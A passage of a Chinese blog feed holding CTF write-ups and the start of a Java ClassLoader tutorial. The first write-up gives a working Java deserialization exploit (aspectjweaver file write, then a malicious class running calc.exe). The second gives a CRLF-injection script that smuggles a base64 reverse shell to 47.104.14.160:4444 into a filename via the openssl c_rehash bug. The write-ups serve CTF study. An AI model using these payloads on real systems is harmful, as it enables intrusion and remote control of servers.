<h2 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h2><p>访问robots.txt之后下载<a href="http://www.zip得到项目源码,用idea打开文件夹/">www.zip得到项目源码，用idea打开文件夹</a></p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220524205154-lxs1o3h.png" alt="image.png"></p>
<p>然后配maven和tomcat就行，注意最后需要用<code>ciscn.fina1.ezj4va.launch.Main</code>中的主方法启动</p>
<h2 id="0x02-审计"><a href="#0x02-审计" class="headerlink" title="0x02 审计"></a>0x02 审计</h2><p>反序列化点</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220524205906-qq5peow.png" alt="image.png"></p>
<p>看一下给的依赖：</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220524205945-03txt4i.png" alt="image.png"></p>
<p>下面构造链子</p>
<p>链子的后半部分可以用ysoserial中的<code>aspectjweaver</code>链子，完成任意文件写入，我们可以参照ysoserial中的写法</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">SimpleCache</span>$StorableCachingMap.<span class="title function_">put</span>()</span><br><span class="line">   <span class="title class_">SimpleCache</span>$StorableCachingMap.<span class="title function_">writeToPath</span>()</span><br><span class="line">        <span class="title class_">FileOutputStream</span>.<span class="title function_">write</span>()</span><br></pre></td></tr></table></figure>


<p>从maven repo上下源码，定位到put方法那里</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220525190804-elumial.png" alt="image.png"></p>
<p>可以看到第一个参数是string，第二个是bytes</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220525190933-9i6z70n.png" alt="image.png"></p>
<p>因此我们通过控制put方法的参数就能写入任意数据，注意要写入的数据为byte数组即可。</p>
<hr>
<p>回到源码，找到CartServiceImpl#addToCart方法，其中对可控变量调用了put</p>
<p>其中key和entry.getValue().add(oldPrice)是可控的</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220525090021-bbg08pb.png" alt="image.png"><br /></p>
<p>cart为他给出的可反序列化的类。</p>
<p>而在<code>ciscn.fina1.ezj4va.controller.CartController#add</code>方法中则调用了这个方法</p>
<p>可以直接通过路由<code>&quot;/cart/add&quot;</code>访问到这个方法</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220525085949-6kjuwtl.png" alt="image.png"></p>
<h2 id="0x03-编写poc"><a href="#0x03-编写poc" class="headerlink" title="0x03 编写poc"></a>0x03 编写poc</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.poc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ciscn.fina1.ezj4va.domain.Cart;</span><br><span class="line"><span class="keyword">import</span> ciscn.fina1.ezj4va.utils.Deserializer;</span><br><span class="line"><span class="keyword">import</span> ciscn.fina1.ezj4va.utils.Serializer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException, InvocationTargetException, InstantiationException &#123;</span><br><span class="line">        System.out.println(getSkus());</span><br><span class="line">        System.out.println(getOldCart());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getSkus</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, IOException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Cart</span> <span class="variable">cart</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cart</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">skuDescribe</span> <span class="operator">=</span> cart.getClass().getDeclaredField(<span class="string">&quot;skuDescribe&quot;</span>);</span><br><span class="line">        skuDescribe.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">inputStr</span> <span class="operator">=</span> <span class="string">&quot;test123&quot;</span>;<span class="comment">//写入数据</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span> <span class="string">&quot;test&quot;</span>;</span><br><span class="line">        map.put(filename,inputStr.getBytes());</span><br><span class="line">        skuDescribe.set(cart,map);</span><br><span class="line">        <span class="type">String</span> <span class="variable">serialize</span> <span class="operator">=</span> Serializer.serialize(cart);</span><br><span class="line">        <span class="keyword">return</span>(serialize);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getOldCart</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;</span><br><span class="line">        <span class="type">Cart</span> <span class="variable">cart</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cart</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">skuDescribe</span> <span class="operator">=</span> cart.getClass().getDeclaredField(<span class="string">&quot;skuDescribe&quot;</span>);</span><br><span class="line">        skuDescribe.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(<span class="string">&quot;C:\\code\\timu\\ezj4va\\&quot;</span>,<span class="number">12</span>);</span><br><span class="line">        cart.setSkuDescribe((Map&lt;String, Object&gt;) o);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cartCookie</span> <span class="operator">=</span> Serializer.serialize(cart);</span><br><span class="line"></span><br><span class="line">        Deserializer.deserialize(cartCookie);</span><br><span class="line">        <span class="keyword">return</span> cartCookie;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>测试可以正常写入数据</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220525191515-rfqfsn6.png" alt="image.png"></p>
<h2 id="0x04-写入到rce"><a href="#0x04-写入到rce" class="headerlink" title="0x04 写入到rce"></a>0x04 写入到rce</h2><p>由于这是个加固题，所以我们对自己的整个服务器位置路径都很清楚，因此写入文件的路径问题就得到了解决。</p>
<p>跟<a href="http://w4nder.top/index.php/2021/07/21/ciscn2021-javachallenges/">w4nder👴👴学的姿势</a>，通过写入一个恶意的class然后加载它，好骚好骚</p>
<p>calc.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ciscn.fina1.ezj4va;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">calc</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">calc</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Serializable readObject&quot;</span>);</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>写入classes目录下，直接加载就行</p>
<p>本机测试：</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220525203639-bgl5ns4.png" alt="image.png"></p>
<p>远程：</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220525210448-xsx4d50.png" alt="image.png"></p>
<p>这个报错绕不过去，更改了jdk版本和他相同也不行</p>
<h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>链子不难，攻击过程没搞完，加固修改uid<br>poc:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.poc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ciscn.fina1.ezj4va.calc;</span><br><span class="line"><span class="keyword">import</span> ciscn.fina1.ezj4va.domain.Cart;</span><br><span class="line"><span class="keyword">import</span> ciscn.fina1.ezj4va.utils.Deserializer;</span><br><span class="line"><span class="keyword">import</span> ciscn.fina1.ezj4va.utils.Serializer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException, InvocationTargetException, InstantiationException &#123;</span><br><span class="line">        System.out.println(getSkus());</span><br><span class="line">        System.out.println(getOldCart());</span><br><span class="line">        System.out.println(getCalc());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getSkus</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, IOException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Cart</span> <span class="variable">cart</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cart</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">skuDescribe</span> <span class="operator">=</span> cart.getClass().getDeclaredField(<span class="string">&quot;skuDescribe&quot;</span>);</span><br><span class="line">        skuDescribe.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">calc</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">inputStr</span> <span class="operator">=</span> readFile(<span class="string">&quot;C:\\code\\timu\\ezj4va\\target\\classes\\ciscn\\fina1\\ezj4va\\calc.class&quot;</span>);<span class="comment">//写入数据</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span> <span class="string">&quot;calc.class&quot;</span>;</span><br><span class="line">        map.put(filename,inputStr.getBytes(StandardCharsets.UTF_8));</span><br><span class="line">        skuDescribe.set(cart,map);</span><br><span class="line">        <span class="type">String</span> <span class="variable">serialize</span> <span class="operator">=</span> Serializer.serialize(cart);</span><br><span class="line">        <span class="keyword">return</span>(serialize);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getOldCart</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;</span><br><span class="line">        <span class="type">Cart</span> <span class="variable">cart</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cart</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">skuDescribe</span> <span class="operator">=</span> cart.getClass().getDeclaredField(<span class="string">&quot;skuDescribe&quot;</span>);</span><br><span class="line">        skuDescribe.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(<span class="string">&quot;/app/target/classes/ciscn/fina1/ezj4va/&quot;</span>,<span class="number">12</span>);</span><br><span class="line">        cart.setSkuDescribe((Map&lt;String, Object&gt;) o);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cartCookie</span> <span class="operator">=</span> Serializer.serialize(cart);</span><br><span class="line"></span><br><span class="line">        Deserializer.deserialize(cartCookie);</span><br><span class="line">        <span class="keyword">return</span> cartCookie;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">readFile</span><span class="params">(String filePath)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// 根据path路径实例化一个输入流的对象</span></span><br><span class="line">        <span class="type">FileInputStream</span>  <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filePath);</span><br><span class="line">        <span class="comment">//2. 返回这个输入流中可以被读的剩下的bytes字节的估计值；</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> fis.available();</span><br><span class="line">        System.out.println(size);</span><br><span class="line">        <span class="comment">//3. 根据输入流中的字节数创建byte数组；</span></span><br><span class="line">        <span class="type">byte</span>[] array = <span class="keyword">new</span> <span class="title class_">byte</span>[size];</span><br><span class="line">        <span class="comment">//4.把数据读取到数组中；</span></span><br><span class="line">        fis.read(array);</span><br><span class="line">        <span class="comment">//5.根据获取到的Byte数组新建一个字符串，然后输出；</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(array);</span><br><span class="line">        result = result.replaceAll(<span class="string">&quot;\r|\n&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        fis.close();</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getCalc</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">calc</span> <span class="variable">calc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">calc</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">serialize</span> <span class="operator">=</span> Serializer.serialize(calc);</span><br><span class="line">        <span class="keyword">return</span> serialize;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>ctfStudy</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>ciscn2022初赛online-cert题解</title>
    <url>/2022/06/01/ciscn2022online-cert/</url>
    <content><![CDATA[<p>这道题当时最后黑灯的时候做出来的，就是卡在最后的payload构造和vps的问题上，比赛前一天一直用的腾讯云过期了，又没钱补，想着问谁借一个能弹shell就行了，没想到控制台安全组放开没用，他还有个宝塔也要一起放开才有用，最后还是借到一个能弹shell的成功了。</p>
<p>感觉这道题对于我来说难点在于对perl脚本的审计，和最后的利用，总体思路其实不难想出。</p>
<h3 id="CVE-2022-1292"><a href="#CVE-2022-1292" class="headerlink" title="CVE-2022-1292"></a>CVE-2022-1292</h3><p><a href="https://github.com/openssl/openssl/commit/7c33270707b568c524a8ef125fe611a8872cb5e8?diff=split">https://github.com/openssl/openssl/commit/7c33270707b568c524a8ef125fe611a8872cb5e8?diff=split</a></p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220531235646-3mpqktf.png" alt="image.png"></p>
<p>filename被拼接到了反引号里</p>
<p>而且他的go web服务里也有一个修改文件名的地方，所以整个题目思路就是在文件名里面插入恶意数据造成rce</p>
<h3 id="crlf注入"><a href="#crlf注入" class="headerlink" title="crlf注入"></a>crlf注入</h3><p>app.py里面写的，完全可以完整的注入一个报文</p>
<p>接着绕过URL.RawPath就行，后来翻看了go web开发相关的文章，了解到这玩意是url安全编码相关的，于是就把请求的url中间的一部分编码了就绕过了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://eci-2ze9sic3tak432765s8u.cloudeci1.ichunqiu.com:8888/proxy&quot;</span></span><br><span class="line">url1 = <span class="string">&quot;http://127.0.0.1:8888/proxy&quot;</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;/%61%64%6d%69%6e/rename?oldname=123&amp;newname=1.crt%22%3Becho%20YmFzaCAtaSA%2BJiAvZGV2L3RjcC80Ny4xMDQuMTQuMTYwLzQ0NDQgMD4mMQ%3D%3D%20%7C%20base64%20-d%20%7C%20bash%20-i%3Becho%22 HTTP/1.1</span></span><br><span class="line"><span class="string">Host: admin</span></span><br><span class="line"><span class="string">User-Agent: admin</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">GET /index&#x27;&#x27;&#x27;</span>.replace(<span class="string">&quot;\\n&quot;</span>,<span class="string">&quot;\\r\\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">&quot;uri&quot;</span>:payload&#125;</span><br><span class="line"></span><br><span class="line">r1 = requests.get(url,data=data)</span><br><span class="line"><span class="built_in">print</span>(r1.text)</span><br></pre></td></tr></table></figure>

<h3 id="rce"><a href="#rce" class="headerlink" title="rce"></a>rce</h3><p>这里怎么rce，我用的是拼接的方式，当然赛后还看到大师傅的wp中有用环境变量的姿势。</p>
<p>我觉得这里才是这道题的细节部分，就是最后一步的处理问题：如何精心构造文件名。</p>
<p>linux中的文件名不能包含斜杠<code>/</code>，所以采用base64编码是首选</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">`<span class="string">&quot;$openssl&quot;</span> x509 $x509hash -fingerprint -noout -<span class="keyword">in</span> <span class="string">&quot;$fname&quot;</span>`;</span><br></pre></td></tr></table></figure>

<p>可以看到可控的部分是<code>$filename</code>，因此做如下截断，通过分号截断命令，然后管道符base64解码其实也是常见姿势：</p>
<p>（当然当时比赛试了n遍）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;;echo YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDQuMTQuMTYwLzQ0NDQgMD4mMQ== | base64 -d | bash -i;echo&quot;</span></span><br></pre></td></tr></table></figure>

<p>最后通过url编码，在我上面构造的poc中能够打通</p>
<p>赛后看一个师傅的wp中，他使用环境变量<code>$&#123;OLDPWD&#125;</code>，直接截图引用大佬橙子酱的分析</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220601001446-1w2wibk.png" alt="image.png"></p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220601001456-ekakhly.png" alt="image.png"></p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220601001515-m3jocjn.png" alt="image.png"></p>
]]></content>
      <categories>
        <category>ctfStudy</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>classloader类加载相关</title>
    <url>/2022/06/04/classloader%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="java代码执行流程"><a href="#java代码执行流程" class="headerlink" title="java代码执行流程"></a>java代码执行流程</h1><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220318204423-paolccp.png" alt="image.png"><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220318204536-oxlseqj.png" alt="image.png"></p>
<p>当 .java 源码被 javac.exe 编译器编译成 .class 字节码文件后，接下来的工作就交给JVM处理。JVM首先通过类加载器(ClassLoader)，将class文件和相关Java API加载装入JVM，以供JVM后续处理。</p>
<h1 id="类的加载过程"><a href="#类的加载过程" class="headerlink" title="类的加载过程"></a>类的加载过程</h1><p>类的生命周期包括：加载、链接、初始化、使用、卸载</p>
<p>其中前三个属于类的<u>加载过程</u></p>
<h2 id="加载-loading"><a href="#加载-loading" class="headerlink" title="加载-loading"></a>加载-loading</h2><p>把<code>.class</code>文件加载到JVM里的过程</p>
<ul>
<li>通过类的全限定名来获取定义此类的二进制字节流</li>
<li>将此二进制字节流所代表的静态存储结构转化成方法区的运行时数据结构</li>
<li>在内存中生成代表此类的java.lang.Class对象,作为该类访问入口.</li>
</ul>
<h2 id="链接-linking"><a href="#链接-linking" class="headerlink" title="链接-linking"></a>链接-linking</h2><p>链接分为三步</p>
<ul>
<li><p>验证:验证的目的是确保class文件的字节流中信息符合虚拟机的要求，不会危害虚拟机安全，使得虚拟机免受恶意代码的攻击，这一步至关重要。</p>
<blockquote>
<p>文件格式验证<br>源数据验证<br>字节码验证<br>符号引用验证  </p>
</blockquote>
</li>
<li><p>准备:准备阶段的工作就是为类的静态变量<strong>分配内存</strong>并设为jvm默认的<strong>初值</strong>，对于非静态的变量，则不会为它们分配内存。静态变量的初值为jvm默认的初值，而不是我们在程序中设定的初值。(仅包含类变量,不包含实例变量).</p>
</li>
<li><p>解析:虚拟机将常量池中的符号引用替换为直接引用，解析动作主要针对类或接口，字段，类方法，方法类型等等。</p>
</li>
</ul>
<h2 id="初始化-initialization"><a href="#初始化-initialization" class="headerlink" title="初始化-initialization"></a>初始化-initialization</h2><p>在该阶段，才真正意义上的开始执行类中定义的java程序代码，该阶段会执行类构造器。</p>
<blockquote>
<p>暂讨论关于类生命周期的三种，之后在学习内存的时候细嗦</p>
</blockquote>
<h1 id="类加载器ClassLoader"><a href="#类加载器ClassLoader" class="headerlink" title="类加载器ClassLoader"></a>类加载器ClassLoader</h1><h2 id="ClassLoader核心方法"><a href="#ClassLoader核心方法" class="headerlink" title="ClassLoader核心方法"></a>ClassLoader核心方法</h2><p>ClassLoader的核心方法有：</p>
<ol>
<li><code>loadClass</code> (加载指定的Java类)</li>
<li><code>findClass</code> (查找指定的Java类)</li>
<li><code>findLoadedClass</code> (查找JVM已经加载过的类)</li>
<li><code>defineClass</code> (定义一个Java类)</li>
<li><code>resolveClass</code> (链接指定的Java类)</li>
</ol>
<h2 id="ClassLoader的作用"><a href="#ClassLoader的作用" class="headerlink" title="ClassLoader的作用"></a>ClassLoader的作用</h2><blockquote>
<p><strong>Java程序在运行前需要先编译成<code>class文件</code>，Java类初始化的时候会调用<code>java.lang.ClassLoader</code>加载类字节码，<code>ClassLoader</code>会调用JVM的native方法(<code>defineClass0/1/2</code>)来定义一个<code>java.lang.Class</code>实例。</strong></p>
</blockquote>
<p>另外一个作用是确认每个类应该由哪个类加载器加载。<br>第二个作用也用于判断JVM运行时的两个类是否相等，影响的判断方法有equals()、isAssignableFrom()、isInstance()以及instanceof关键字。</p>
<h2 id="何时触发类加载"><a href="#何时触发类加载" class="headerlink" title="何时触发类加载"></a>何时触发类加载</h2><p>类加载的触发可以分为隐式加载和显示加载。</p>
<h3 id="隐式加载"><a href="#隐式加载" class="headerlink" title="隐式加载"></a>隐式加载</h3><p>隐式加载包括以下几种情况：</p>
<ul>
<li>遇到new、getstatic、putstatic、invokestatic这4条字节码指令时</li>
<li>对类进行反射调用时</li>
<li>当初始化一个类时，如果其父类还没有初始化，优先加载其父类并初始化</li>
<li>虚拟机启动时，需指定一个包含main函数的主类，优先加载并初始化这个主类</li>
</ul>
<h3 id="显式加载"><a href="#显式加载" class="headerlink" title="显式加载"></a>显式加载</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 反射加载TestHelloWorld示例</span></span><br><span class="line">Class.forName(<span class="string">&quot;top.longlone.TestHelloWorld&quot;</span>);</span><br><span class="line"><span class="comment">// ClassLoader加载TestHelloWorld示例</span></span><br><span class="line"><span class="built_in">this</span>.getClass().getClassLoader().loadClass(<span class="string">&quot;top.longlone.TestHelloWorld&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>显示加载包含以下几种情况：</p>
<ul>
<li>通过ClassLoader的loadClass方法</li>
<li>通过Class.forName（反射获取Class）</li>
<li>通过ClassLoader的findClass方法</li>
</ul>
<h2 id="ClassLoader分类"><a href="#ClassLoader分类" class="headerlink" title="ClassLoader分类"></a>ClassLoader分类</h2><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220318210756-8jnb18t.png" alt="image.png"></p>
<p>从上到下认识他们</p>
<h3 id="启动类-x2F-引导类：Bootstrap-ClassLoader"><a href="#启动类-x2F-引导类：Bootstrap-ClassLoader" class="headerlink" title="启动类&#x2F;引导类：Bootstrap ClassLoader"></a>启动类&#x2F;引导类：Bootstrap ClassLoader</h3><p>这个类加载器使用C&#x2F;C++语言实现的，嵌套在JVM内部，java程序无法直接操作这个类。它用来加载<strong>Java核心类库</strong>，如：<code>JAVA_HOME/jre/lib/rt.jar</code>、<code>resources.jar</code>、<code>sun.boot.class.path</code>路径下的包，用于提供<strong>jvm运行所需的包</strong>。</p>
<p>并不是继承自java.lang.ClassLoader，它没有父类加载器</p>
<p>它加载<code>扩展类加载器</code>和<code>应用程序类加载器</code>，并成为他们的<strong>父类加载器</strong></p>
<p>出于安全考虑，启动类只加载包名为：java、javax、sun开头的类</p>
<h3 id="扩展类加载器：Extension-ClassLoader"><a href="#扩展类加载器：Extension-ClassLoader" class="headerlink" title="扩展类加载器：Extension ClassLoader"></a>扩展类加载器：Extension ClassLoader</h3><p>Java语言编写，由<code>sun.misc.Launcher$ExtClassLoader</code>实现，我们可以用Java程序操作这个加载器派生继承自java.lang.ClassLoader，父类加载器为<code>启动类加载器</code></p>
<p>从系统属性：<code>java.ext.dirs</code>目录中加载类库，或者从JDK安装目录：<code>jre/lib/ext</code>目录下加载类库。我们就可以将我们自己的包放在以上目录下，就会自动加载进来了。</p>
<h3 id="应用程序类加载器：Application-Classloader"><a href="#应用程序类加载器：Application-Classloader" class="headerlink" title="应用程序类加载器：Application Classloader"></a>应用程序类加载器：Application Classloader</h3><p>程序默认的类加载器，我们编写的类就是由他来加载。</p>
<p>Java语言编写，由sun.misc.Launcher$AppClassLoader实现。<br>派生继承自<code>java.lang.ClassLoader</code>，父类加载器为ExtClassloader</p>
<p>它负责加载环境变量classpath或者系统属性java.class.path指定路径下的类库</p>
<p>我们可以通过<code>ClassLoader#getSystemClassLoader()</code>获取并操作这个加载器</p>
<h3 id="自定义加载器"><a href="#自定义加载器" class="headerlink" title="自定义加载器"></a>自定义加载器</h3><p>为了实现自己的功能，比如加强安全传输，我们可以自己编写加载器。</p>
<p>继承<code>java.lang.ClassLoader</code>类，重写findClass()方法如果没有太复杂的需求，可以直接继承<code>URLClassLoader</code>类，重写<code>loadClass</code>方法，具体可参考<code>AppClassLoader</code>和<code>ExtClassLoader</code>。</p>
<h2 id="获取ClassLoader"><a href="#获取ClassLoader" class="headerlink" title="获取ClassLoader"></a>获取ClassLoader</h2><p>除了启动类加载器，其他加载器都是继承自<code>java.lang.ClassLoader</code>这个抽象类。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 方式一：获取当前类的 ClassLoader</span></span><br><span class="line">clazz.getClassLoader()</span><br><span class="line"><span class="comment">// 方式二：获取当前线程上下文的 ClassLoader</span></span><br><span class="line">Thread.currentThread().getContextClassLoader()</span><br><span class="line"><span class="comment">// 方式三：获取系统的 ClassLoader</span></span><br><span class="line">ClassLoader.getSystemClassLoader()</span><br><span class="line"><span class="comment">// 方式四：获取调用者的 ClassLoader</span></span><br><span class="line">DriverManager.getCallerClassLoader()</span><br></pre></td></tr></table></figure>

<h1 id="类加载流程"><a href="#类加载流程" class="headerlink" title="类加载流程"></a>类加载流程</h1><ol>
<li>调用<code>loadClass</code>加载</li>
